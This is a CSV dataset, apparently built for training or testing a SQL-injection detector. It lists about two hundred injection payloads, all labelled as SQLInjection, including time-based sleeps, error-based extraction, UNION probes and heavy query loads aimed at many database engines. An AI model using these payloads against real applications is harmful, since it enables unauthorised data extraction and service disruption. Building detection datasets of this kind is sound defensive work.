Sentence,SQLInjection,XSS,Normal
"1"" where 4366 = 4366 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,0,0
"1' )  or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) ",1,0,0
"1'+ ( select 'ovti' where 4243 = 4243 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5  )  )  +'",1,0,0
1'|| ( select 'awic' where 5227 = 5227,1,0,0
1'  )  )   )  or sleep ( 5 ) #,1,0,0
"-8327 where 7555 = 7555 or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 1570 = 1570 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,0,0
-5229'  )  )   as tkqp where 9253 = 9253 or 9323 = 9323#,1,0,0
1' where 8482 = 8482 or sleep ( 5 ) #,1,0,0
"1' in boolean mode )  union all select null,null,null,null,null,null,null--",1,0,0
"1%""  )  )   and 8316 = 6410#",1,0,0
"1'+ ( select zfpk where 9784 = 9784 or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  )  +'",1,0,0
select  ( case when  ( 3325 = 1767 )  then 3325 else 3325* ( select 3325 from mysql.db )  end ) #,1,0,0
"1 )  or 4411 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) ",1,0,0
"-8117' union all select 9945,9945,9945,9945,9945,9945,9945#",1,0,0
1'|| ( select 'ocmk' from dual where 3961 = 3961 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   ) ||',1,0,0
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 )  from dual and   (  (  'cgou' like 'cgou",1,0,0
1  )  )   )  and 9575 = 1640--,1,0,0
"-3963"" or 1224 = 5119",1,0,0
" select sleep ( 5 )  and  ( ""%"" = """,1,0,0
"1""  )  )   and 9254 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,0,0
1'+ ( select ukwc where 3008 = 3008 or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1,0,0
"1"" where 2483 = 2483",1,0,0
"-6442""  )  )   )  or 3038 = 3038",1,0,0
1%' and  ( 2439 = 2555 ) *2555 and '%' = ',1,0,0
"1"" or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )  and ""kbex"" like ""kbex",1,0,0
"1' where 9420 = 9420 and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"-8215%"" )  union all select 3877,3877,3877,3877,3877,3877--",1,0,0
"-7069 )  union all select 6638,6638,6638,6638,6638,6638--",1,0,0
select  ( case when  ( 8234 = 2498 )  then 8234 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,0,0
1' )  where 2120 = 2120,1,0,0
"iif ( 1878 = 2513,1,1/0 ) ",1,0,0
"1%""  )  )   )  union all select null,null,null,null#",1,0,0
1 )  and sleep ( 5 )  and  ( 4855 = 4855,1,0,0
"-9392  )  )   or elt ( 1032 = 1032,3623 )  and   (  (  2975 = 2975",1,0,0
"-8200%""  )  )   union all select 7538,7538,7538#",1,0,0
1 and  ( 3437 = 2271 ) *2271,1,0,0
"-5802'  )  )   )  union all select 6286,6286,6286,6286#",1,0,0
"1'+ ( select 'plcm' where 2141 = 2141 and elt ( 3114 = 3114,sleep ( 5  )  )  #",1,0,0
"1 or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )  -- uslt",1,0,0
"1' in boolean mode )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) #",1,0,0
select  ( case when  ( 3672 = 8360 )  then 3672 else 3672* ( select 3672 from information_schema.character_sets )  end ) #,1,0,0
"1 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  # jmki",1,0,0
1 where 1092 = 1092,1,0,0
1' )  where 9538 = 9538,1,0,0
"1' )  where 9006 = 9006 union all select null,null,null,null,null,null--",1,0,0
"-6854"" where 7794 = 7794 union all select 7794,7794--",1,0,0
1'|| ( select 'mosp' where 6085 = 6085,1,0,0
"1' )  and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and  ( 'wdeu' like 'wdeu",1,0,0
-6215' )  or  ( 8459 = 8459 ) *4906,1,0,0
"-8136' )  union all select 1324,1324,1324,1324#",1,0,0
1 and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) -- jdia,1,0,0
-5336' )  where 8691 = 8691 or 3608 = 1887--,1,0,0
"1%""  )  )   union all select null,null,null,null,null#",1,0,0
1'  )  )   )  and  ( 5995 = 9618 ) *9618 and   (  (   ( 'nagr' like 'nagr,1,0,0
1'|| ( select 'homm' where 4937 = 4937 rlike  ( select * from  ( select ( sleep ( 5  )  )   ) vwyq ) #,1,0,0
"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null )  and  ( 9646 = 9646",1,0,0
-8095' )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  ,1,0,0
1 )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( 6824 = 6824,1,0,0
"1'  )  )   and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  'ekla' = 'ekla",1,0,0
"1' )  and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )   and  ( 'zspf' = 'zspf",1,0,0
"-2222' in boolean mode )  union all select 7649,7649,7649,7649,7649,7649,7649,7649--",1,0,0
"-3525"" where 3522 = 3522 union all select 3522,3522,3522,3522,3522,3522,3522,3522,3522#",1,0,0
"1'  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
-7746'  )  )   )  or 4144 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4144 = 4144 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and   (  (   ( 'itxy' like 'itxy,1,0,0
"1  )  )   as nnpe where 9720 = 9720 union all select null,null,null,null,null,null,null,null,null#",1,0,0
1 where 6523 = 6523 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1,0,0
select case when 2930 = 7964 then 1 else null end--,1,0,0
"1"" where 7631 = 7631 and 4733 = 3439",1,0,0
1 )  as crsd where 5271 = 5271 waitfor delay '0:0:5'--,1,0,0
1%'  )  )   )  rlike sleep ( 5 )  and   (  (   ( '%' = ',1,0,0
select case when 6555 = 7349 then 1 else null end--,1,0,0
"1 where 4448 = 4448 union all select null,null,null,null,null#",1,0,0
1'|| ( select 'hafu' where 6226 = 6226,1,0,0
1'+ ( select mfcd where 6757 = 6757 and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4386 = 4386 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) +',1,0,0
1' )  where 2852 = 2852,1,0,0
"1' and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )  ",1,0,0
select  ( case when  ( 1898 = 4705 )  then 1898 else 1/ ( select 0 )  end ) --,1,0,0
1  )  )   as svhd where 9761 = 9761,1,0,0
"-1868  )  )   union all select 1859,1859--",1,0,0
"1  )  )   )  and 8189 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
"1"" )  rlike  ( select  ( case when  ( 8732 = 6244 )  then 1 else 0x28 end  )  )   and  ( ""unuk"" = ""unuk",1,0,0
"1""  )  )   or sleep ( 5 )  and   (  (  ""mcyv"" = ""mcyv",1,0,0
1'|| ( select 'agng' from dual where 3337 = 3337 rlike sleep ( 5  )  )  ||',1,0,0
"-3270"" where 2144 = 2144 or 2724 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 2724 = 2724 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,0,0
-9700' )  or 8811 = 7862,1,0,0
select sleep ( 5  )  )  ||',1,0,0
"1 )  as wbcd where 9506 = 9506 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,0,0
"1' )  as bagi where 1281 = 1281  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users ) --",1,0,0
1  )  )   and 3715 in   (  (  char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 3715 = 3715 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   )  and   (  (  7594 = 7594,1,0,0
"1""  )  )   )  and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and   (  (   ( ""rsru"" = ""rsru",1,0,0
"1"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153  )  )  #",1,0,0
"1' where 9961 = 9961 and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
1' and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   )  and 'yvxg' = 'yvxg,1,0,0
1%' and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and '%' = ',1,0,0
"-3420 where 9681 = 9681 or make_set ( 2438 = 1977,1977 ) --",1,0,0
1'  )  )   as vrwr where 3830 = 3830,1,0,0
"1"" )  where 1833 = 1833",1,0,0
"1'+ ( select aahc where 5436 = 5436 and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   ) +'",1,0,0
"1%"" )  and make_set ( 8403 = 8403,8899 )  and  ( ""%"" = """,1,0,0
"1'  ( select  ( case when  ( 5451 = 5451 )  then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null )  else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 )  end )  from information_schema.system_users )  and 'uqyt' = 'uqyt",1,0,0
"1'|| ( select 'adiv' from dual where 9842 = 9842 and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 6055 = 6055 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )    )  )  ||'",1,0,0
"1 )  and exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8190 = 8190,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )  ",1,0,0
"1"" and elt ( 1210 = 1210,sleep ( 5  )  )  ",1,0,0
"1'+ ( select 'ewlk' where 1078 = 1078 and 2716 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,0,0
"1%"" union all select null#",1,0,0
"1""  )  )   and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 )  and   (  (  ""qqky"" like ""qqky",1,0,0
-7810 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )  -- vuvj,1,0,0
"1 )  as kzyb where 7023 = 7023 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,0,0
"select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and  ( 'hube' = 'hube",1,0,0
"-5150  )  )   )  union all select 5660,5660,5660#",1,0,0
"1  )  )   )  or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
-9650' )  or 1390 = 3209,1,0,0
-3582' )  or 6872 = 6872 and  ( 'gyfj' = 'gyfj,1,0,0
"1'|| ( select 'zbdv' where 1618 = 1618 or exp ( ~ ( select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 6270 = 6270,1  )  )   ) ,0x717a767a71,0x78  )  )  x  )  )   ) ||'",1,0,0
"1'  )  )   and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and   (  (  'bzak' like 'bzak",1,0,0
"select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  (   ( '%' = '",1,0,0
-4900'  )  )   or 7208 = 3236,1,0,0
1  )  )   as zldh where 3302 = 3302 rlike  ( select  ( case when  ( 1481 = 5677 )  then 1 else 0x28 end  )  )  --,1,0,0
"1'+ ( select zpns where 6922 = 6922 and  ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9067 = 9067,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a  )  )  +'",1,0,0
1' )  as ulbr where 7233 = 7233 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1,0,0
-5500' )  order by 1--,1,0,0
"1'+ ( select 'mgrj' where 8514 = 8514 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 1045 = 1045,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from  ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x  )  )  +'",1,0,0
"-9988%"" or elt ( 1032 = 1032,3623 )  and ""%"" = """,1,0,0
"1"" where 4161 = 4161 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1,0,0
"-2602' union all select 5715,5715,5715,5715,5715,5715,5715,5715,5715--",1,0,0
1' and  ( 3423 = 7789 ) *7789 and 'pdia' like 'pdia,1,0,0
"iif ( 4436 = 8910,1,1/0 ) ",1,0,0
"1'|| ( select 'kbvq' where 9279 = 9279 and extractvalue ( 7982,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 7982 = 7982,1  )  )   ) ,0x717a767a71  )  )   ) ||'",1,0,0
select  ( case when  ( 3336 = 9781 )  then 3336 else 1/ ( select 0 )  end ) --,1,0,0
-1021 )  as erjh where 7845 = 7845 or 4747 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4747 = 4747 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1,0,0
"1%' or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )   and '%' = '",1,0,0
-7034'  )  )   )  union all select 4023#,1,0,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   and   (  (   ( 'lijy' = 'lijy",1,0,0
"1 )  as adzj where 5575 = 5575 or 8421 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1%"" or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,0,0
select  ( case when  ( 8350 = 7872 )  then 8350 else 8350* ( select 8350 from information_schema.character_sets )  end ) #,1,0,0
"-4287%""  )  )   union all select 9074,9074,9074,9074,9074,9074,9074,9074,9074,9074#",1,0,0
1'  )  )   or  ( select * from  ( select ( sleep ( 5  )  )   ) sddo ) #,1,0,0
"1%""  )  )   or 4915 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1"" or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and ""ctdc"" = ""ctdc",1,0,0
"1%"" and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
select  ( case when  ( 8362 = 7572 )  then 8362 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1,0,0
"1"" where 2886 = 2886",1,0,0
"1' where 6417 = 6417 or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 )  = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,0,0
-8777%'  )  )   )  or  ( 3934 = 2025 ) *2025 and   (  (   ( '%' = ',1,0,0
"1%""  )  )   )  and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (   ( ""%"" = """,1,0,0
"1'+ ( select 'qzcx' where 9524 = 9524 and elt ( 3069 = 8430,8430  )  )  +'",1,0,0
"1 )  where 8734 = 8734 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75  )  )    )  )   ) ,1 ) #",1,0,0
"1%""  )  )   )  rlike  ( select  ( case when  ( 7689 = 7689 )  then 1 else 0x28 end  )  )   and   (  (   ( ""%"" = """,1,0,0
"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",1,0,0
"1%' union all select null,null#",1,0,0
"1' and elt ( 1210 = 1210,sleep ( 5  )  )   and 'yhpp' like 'yhpp",1,0,0
"1""  )  )   or sleep ( 5 ) #",1,0,0
"1'  )  )   as pstn where 6691 = 6691 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select  ( case when  ( 4241 = 4241 )  then char ( 49 )  else char ( 48 )  end  )  )  +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113  )  )   ) --",1,0,0
"1""  )  )   or elt ( 6272 = 6272,sleep ( 5  )  )   and   (  (  ""chvi"" like ""chvi",1,0,0
-2181' )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and  ( 'wyez' = 'wyez,1,0,0
"1'|| ( select 'pzto' from dual where 7338 = 7338 and 6414 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  )  ||'",1,0,0
"1'  )  )   as cgey where 2130 = 2130 and make_set ( 7914 = 4032,4032 ) --",1,0,0
"-7078'|| ( select 'lcza' where 5076 = 5076 union all select 5076,5076,5076,5076,5076,5076,5076,5076,5076,5076--",1,0,0
1'+ ( select 'iify' where 6257 = 6257 or 6793 =  ( select 6793 from pg_sleep ( 5  )  )   ) +',1,0,0
"-1975"" union all select 8638,8638,8638,8638,8638,8638,8638,8638,8638#",1,0,0
"1'|| ( select 'kgfu' from dual where 2607 = 2607 and 3580 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,0,0
"1"" where 3329 = 3329 or sleep ( 5 ) --",1,0,0
"1' where 7014 = 7014 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745  )  )  --",1,0,0
"1""  )  )   as duny where 3756 = 3756 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,0,0
"1"" where 1920 = 1920 and 8635 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
select  ( case when  ( 9246 = 6326 )  then 9246 else 9246* ( select 9246 from mysql.db )  end ) #,1,0,0
1' in boolean mode )  and 6240 =  ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) #,1,0,0
"1'  )  )   and elt ( 3053 = 9778,9778 )  and   (  (  'yfaa' like 'yfaa",1,0,0
"-6145'+ ( select nnjn where 1389 = 1389 union all select 1389,1389,1389--",1,0,0
" end and   (  (   ( ""%"" = """,1,0,0
"-1280"" union all select 8602,8602,8602,8602,8602,8602,8602,8602,8602,8602#",1,0,0
"1%""  ( select  ( case when  ( 4587 = 4587 )  then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )  else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 )  end )  from  ( values ( 0  )  )   )  and ""%"" = """,1,0,0
"1"" )  and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )  and  ( ""ypoj"" = ""ypoj",1,0,0
"1%""  )  )   or 5286 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 )  and   (  (  ""%"" = """,1,0,0
"-9615 )  as dntk where 4780 = 4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",1,0,0
"1"" where 3990 = 3990 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --",1,0,0
1' and 6969 =  ( select 6969 from pg_sleep ( 5  )  )   and 'dgvg' = 'dgvg,1,0,0
"1'  )  )   as jpxj where 6153 = 6153 or 8156 =  ( select count ( * )  from generate_series ( 1,5000000  )  )  --",1,0,0
"1' where 4860 = 4860 or 5356 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,0,0
"1' where 7688 = 7688 union all select null,null,null,null,null,null,null,null,null--",1,0,0
"-7981%"" union all select 4532,4532,4532,4532,4532,4532,4532#",1,0,0
"1"" )  where 8612 = 8612",1,0,0
"1' )  and make_set ( 8403 = 8403,8899 )  and  ( 'kyxl' = 'kyxl",1,0,0
1' where 1017 = 1017 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1,0,0
-4947' order by 1#,1,0,0
"1"" where 6023 = 6023",1,0,0
"1'|| ( select 'ypil' from dual where 4568 = 4568 or 7552 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  )  ||'",1,0,0
"1%""  )  )   )  and 9198 = 9198--",1,0,0
1' )  and 3754 =  ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 3754 = 3754 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62  )  )   )  from dual )  and  ( 'bmhw' like 'bmhw,1,0,0
"1"" and 2853 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 2853 = 2853 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and ""mbas"" = ""mbas",1,0,0
1 where 4785 = 4785 and 7756 = dbms_utility.sqlid_to_sqlhash  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 7756 = 7756 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   ) --,1,0,0
"1""  )  )   and elt ( 6553 = 4771,4771 )  and   (  (  ""eolu"" = ""eolu",1,0,0
"1'  )  )   )  union all select null,null,null--",1,0,0
"1  )  )   and 3824 = benchmark ( 5000000,md5 ( 0x76555642  )  )   and   (  (  8280 = 8280",1,0,0
"1'  )  )   )  union all select null,null,null,null,null,null,null,null,null--",1,0,0
"-7714 where 9768 = 9768 union all select 9768,9768--",1,0,0
"1' )  or 8315 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) ",1,0,0
1  )  )   as uadn where 9588 = 9588 rlike sleep ( 5 ) #,1,0,0
1 )  as wiyx where 6515 = 6515,1,0,0
